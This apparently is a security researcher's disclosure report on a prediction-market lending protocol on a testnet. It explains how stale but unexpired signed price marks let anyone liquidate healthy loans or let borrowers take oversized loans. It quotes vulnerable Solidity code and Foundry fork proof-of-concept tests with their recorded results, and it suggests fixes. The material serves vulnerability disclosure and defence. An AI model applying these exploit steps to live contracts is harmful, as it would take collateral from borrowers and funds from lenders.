# Based on deployed contracts

Project: PM-01 — name-redacted prediction-market lending protocol
Category: Prediction-market collateral lending, leveraged outcome positions and asynchronous lending vault
Severity: High — confirmed mechanism with signed-input and market prerequisites
Engagement: Independent hunting + responsible disclosure
Chain: Polygon Amoy testnet, chain ID 80002; source/fork snapshot block 51,383,934 (28 October 2026)
Tech stack: Solidity 0.8.26 / EVM, OpenZeppelin, ERC20, ERC1155, ERC4626 and ERC7540-style asynchronous redemption; Foundry / local Anvil fork tooling
Evidence: Historical local-fork test source and reported results; synthetic setup described below
Remediation: No confirmed remediation is established.
Contribution: Independent security research; program acceptance is not asserted.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Superseded signed prices remain actionable inside the freshness window

## Description

A valid price attestation remains usable until its age window expires even if a newer price makes it economically wrong. The shared verifier checks age and signature without storing the latest sequence or timestamp. An observer can select a low historical mark to liquidate a loan healthy at the modeled current price; a borrower with collateral and a matching valid premium quote can use a high historical mark to originate an oversized loan after a price decline.

The low direction requires an active loan and a still-valid low mark for the Liquidator domain. The high direction also requires a borrower-bound quote, collateral, capital and available capacity. Public calldata can reveal marks; the PoCs manufacture legitimate signatures with controlled keys rather than proving actual production signing-service behavior.

The deployment association is with the recorded Polygon Amoy testnet snapshot. Provider-runtime comparison does not establish independent recompilation, equivalence to an earlier audit revision, or a mainnet incident.

### Mechanism step by step

#### Step 1 — Accept an old but still-window-valid mark

Source: `src/MarkVerifier.sol:55-63`

```solidity
    function _verifyMark(MarkAttestation calldata m, bytes calldata sig) internal view {
        if (block.timestamp > uint256(m.timestamp) + markFreshness) {
            revert Errors.StaleMark(m.timestamp, markFreshness);
        }

        bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(MARK_TYPEHASH, m.tokenId, m.mark, m.timestamp)));
        address recovered = ECDSA.recover(digest, sig);
        if (recovered != markSigner) revert Errors.SignerInvalid(recovered);
    }
```

The predicate has no latest-mark state, sequence consumption or comparison with another observed price. Signature/domain checks remain intact. The recorded old mark is 240 seconds old within a 300-second window.

#### Step 2 — Liquidate using the selected low price

Source: `src/Liquidator.sol:231-239`

```solidity
    function _trigger(uint256 loanId, MarkAttestation calldata m, bytes calldata mSig) internal {
        ILedger.Loan memory l = ledger.loan(loanId);
        if (l.status != LoanStatus.Active) revert Errors.LoanNotActive(loanId);
        _verifyMark(m, mSig);
        if (!_breach(l, m)) revert Errors.LoanNotLiquidatable(loanId);

        emit Events.LiquidationTriggered(loanId, msg.sender, m.mark);
        _settleShortfall(loanId, l.principal, false);
    }
```

Anyone can reach this path through triggerLiquidation (`src/Liquidator.sol:100-102`). It verifies the supplied mark and checks that price for breach. A later healthy price is not consulted. Settlement sends collateral to the liquidation wallet (`src/Liquidator.sol:260-274`).

#### Step 3 — Size a new loan using the selected high price

Source: `src/BorrowerLogic.sol:38-54`

```solidity
        // The attestation set binds to the caller and the action: quote to borrower, market, and
        // quantity; mark to the market being posted.
        if (q.borrower != msg.sender || q.tokenId != p.tokenId || q.collateralQty != p.qty || m.tokenId != p.tokenId) {
            revert Errors.QuoteMismatch();
        }

        premiumOracle.consumeQuote(q, qSig);
        _verifyMark(m, mSig);

        // Principal is computed here, not believed: the band and haircut are timelocked policy,
        // the mark was verified in this transaction, so sizing binds to the price at execution
        // and the signer is trusted only for the premium (4.4).
        uint256 sized = _sizedPrincipal(p.tokenId, p.qty, m.mark);
        if (q.principal != sized) revert Errors.PrincipalOutOfBand(sized, q.principal);

        // Collateral in. The inbound leg has no sender-side hook, and the guard holds regardless.
        ctf.safeTransferFrom(msg.sender, address(this), p.tokenId, p.qty, "");
```

The quote is correctly bound to borrower, collateral and principal, but principal is recomputed from the old accepted price. In the proof, 20,000 outcome units at 0.60 support 6,000 principal even though modeled current value at 0.25 is 5,000.

#### Step 4 — Allocate settlement proceeds without returning borrower surplus

Source: `src/Liquidator.sol:153-163`

```solidity
        uint256 outstanding = _buffer.outstandingAdvance(loanId);
        uint256 bufferRepaid = amount < outstanding ? amount : outstanding;
        uint256 afterAdvance = amount - bufferRepaid;
        uint256 restoredSoFar = poolRestored[loanId];
        uint256 unrestored = ledger.poolLoss(loanId) - restoredSoFar;
        uint256 restored = afterAdvance < unrestored ? afterAdvance : unrestored;
        uint256 treasuryCut = MathLib.bpsDown(afterAdvance - restored, surplusSplitBps);
        uint256 poolShare = afterAdvance - treasuryCut;

        if (restored != 0) poolRestored[loanId] = restoredSoFar + restored;
        emit Events.ProceedsRemitted(loanId, amount, bufferRepaid, treasuryCut, poolShare);
```

Expiry or liquidation records the shortfall; a remitter later supplies proceeds. Buffer and pool-loss restoration precede treasury/pool surplus allocation. The attacker triggering low liquidation does not receive collateral directly, and real venue disposal is outside the proof.

### Impact and proof limits

The low receipt records seizure of 20,000 outcome units and 5,939.822053 pUSD booked loss; the economic follow-up reports borrower net -6,060.328768 at the assumed disposal price. The high receipt records 5,993.967122 loss at settlement and 5,000 modeled proceeds; borrower-profit modeling reports +939.671232 after a 5,000 acquisition cost. Tokens and sale proceeds are minted in the harness. NAV excludes separately reserved recoveries, so its post-remittance delta is not the final net lender loss after recovery claims.

The later loop receipt reports three cycles and +13,213.438356 modeled attacker net. However, `V3Drain.t.sol:64-73,90-102` increments local `ts` by 600 without `vm.warp`; later marks are future-dated relative to chain time. This mixes V3 with N1 and does not independently prove repeated honest historical windows. Each cycle supplies controlled quotes and remittance. The loop’s generic failed honest-borrow call is not an error-selector-isolated breaker proof. No real acquisition, public-mempool race or mainnet loss is established.

### Remediation direction

Define enforceable current-price ordering, such as monotonic sequences or a canonical mark update, and reject future timestamps with a narrow clock-skew policy. Retest both directions with current-price controls and genuine progression of chain time; action-bound signatures may also be appropriate.

No confirmed fix is established by the available evidence.

## Proof of concept

Recorded tests: `test_poc1_staleLowMarkLiquidation`, `poc/src/[project]ForkPoCs.sol:197-230`; `test_poc2_staleHighMarkOversizedBorrow`, same file `:236-268`; impact refinements in `poc/src/FinalProofs.t.sol:156-194`; qualified loop `poc/src/V3Drain.t.sol:57-131`.

Setup impersonates the timelock to install controlled mark/quote signers and mints lender funds and outcome collateral. The public steps assume legitimate signatures are available; they do not demonstrate compromising those signers. Sale proceeds are minted and remitted by an impersonated privileged wallet.

## Relevant test excerpts

Controlled setup; the preceding RPC-bearing fork line is omitted:

Source: `poc/src/[project]ForkPoCs.sol:148-165`

```solidity
        markSigner = vm.addr(markKey);
        quoteSigner = vm.addr(quoteKey);
        // Test scaffolding: install test signers behind the timelock address.
        vm.startPrank(TL);
        pool.setMarkSigner(markSigner);
        liq.setMarkSigner(markSigner);
        oracle.setSigner(quoteSigner);
        vm.stopPrank();
        // Lender funds the book.
        pusd.mint(lender, 100_000e6);
        vm.startPrank(lender);
        pusd.approve(VAULT, type(uint256).max);
        vault.deposit(100_000e6, lender);
        vm.stopPrank();
        // Borrower holds collateral.
        ctf.mint(borrower, TOKEN_ID, QTY);
        vm.prank(borrower);
        ctf.setApprovalForAll(POOL, true);
```

Current-price negative control, stale-low action and seizure assertions:

Source: `poc/src/[project]ForkPoCs.sol:208-226`

```solidity
        // In the same window the signer published a low mark 0.32 (a real dip).
        // The market has since rebounded to 0.60; the low mark is still fresh.
        MarkAttestation memory mLow = MarkAttestation(TOKEN_ID, MARK_032, t0);
        bytes memory sigLow = _signMark(liq.MARK_DOMAIN_SEPARATOR(), mLow);
        vm.warp(t0 + 240); // within the 300s freshness window

        // Healthy at any current mark: 12_000e6 >= 6_600e6 threshold.
        MarkAttestation memory mCur = MarkAttestation(TOKEN_ID, MARK_060, t0 + 240);
        assertTrue(!liq.isLiquidatable(loanId, mCur), "healthy at current mark");

        // The stale low mark liquidates anyway. Anyone may trigger.
        uint256 walletBefore = ctf.balanceOf(LIQ_WALLET, TOKEN_ID);
        vm.prank(attacker);
        liq.triggerLiquidation(loanId, mLow, sigLow);

        Loan memory l = ledger.loan(loanId);
        assertTrue(l.status == LoanStatus.Liquidated, "loan liquidated via stale mark");
        assertEq(ctf.balanceOf(LIQ_WALLET, TOKEN_ID) - walletBefore, QTY, "collateral seized");
        assertEq(ctf.balanceOf(borrower, TOKEN_ID), 0, "borrower retains no collateral");
```

Stale-high origination and current-price breach check:

Source: `poc/src/[project]ForkPoCs.sol:237-249`

```solidity
        uint64 t0 = uint64(block.timestamp);
        // Mark 0.60 signed at t0. Market gaps to 0.25 within the window.
        MarkAttestation memory mStale = MarkAttestation(TOKEN_ID, MARK_060, t0);
        PremiumQuote memory q = _quote(borrower, 6_000e6, 1 days, 1, t0 + 300);
        vm.warp(t0 + 240);
        bytes memory qSig = _signQuote(q);
        bytes memory mSig = _signMark(pool.MARK_DOMAIN_SEPARATOR(), mStale);
        vm.prank(borrower);
        uint256 loanId = pool.borrow(BorrowParams(TOKEN_ID, QTY, borrower), q, qSig, mStale, mSig);
        // At the true mark 0.25 the loan is deep past maintenance:
        // value 5_000e6 < 6_000e6 * 1.10 threshold. Instantly liquidatable.
        MarkAttestation memory mTrue = MarkAttestation(TOKEN_ID, MARK_025, t0 + 240);
        assertTrue(liq.isLiquidatable(loanId, mTrue), "oversized loan instantly past maintenance");
```

Controlled remittance and assertions:

Source: `poc/src/[project]ForkPoCs.sol:253-268`

```solidity
        vm.warp(t0 + 240 + 1 days);
        liq.claimExpired(loanId);
        uint256 lossBefore = ledger.poolLoss(loanId);

        pusd.mint(LIQ_WALLET, 5_000e6);
        vm.startPrank(LIQ_WALLET); // remitter role on the fork
        pusd.approve(LIQUIDATOR, 5_000e6);
        liq.remitProceeds(loanId, 5_000e6);
        vm.stopPrank();

        uint256 nav = vault.totalAssets();
        emit Receipt(string(abi.encodePacked(
            "V3_HIGH_RESULT={status:Expired, poolLossAtSettle:", _u2s(lossBefore),
            ", recoveredAtTruePrice:5000000000, navAfterRemit:", _u2s(nav), "}")));
        assertTrue(lossBefore >= 5_900e6, "loss ~= principal minus escrow");
        assertTrue(nav < 100_000e6, "lender NAV impaired by stale-high origination");
```

Recorded receipts (six-decimal pUSD values):

Source: `poc/README.md:29-30`

```text
V3_LOW_RESULT={status:Liquidated, borrowerCtfRecovered:0, seizedQty:20000e6, poolLoss:5939822053, windowLeftSeconds:60}
V3_HIGH_RESULT={status:Expired, poolLossAtSettle:5993967122, recoveredAtTruePrice:5000000000, navAfterRemit:94060328768}
```

Source: `poc/README.md:49-50`

```text
V3_LOW_IMPACT_RESULT={borrowerNet:-6060328768, treasuryGain:1200000000, poolRecovery:10739822053}
V3_HIGH_PROFIT_RESULT={borrowerCashOut:5939671232, collateralTrueValue:5000000000, borrowerNetGain:939671232, poolLoss:5993967122}
```
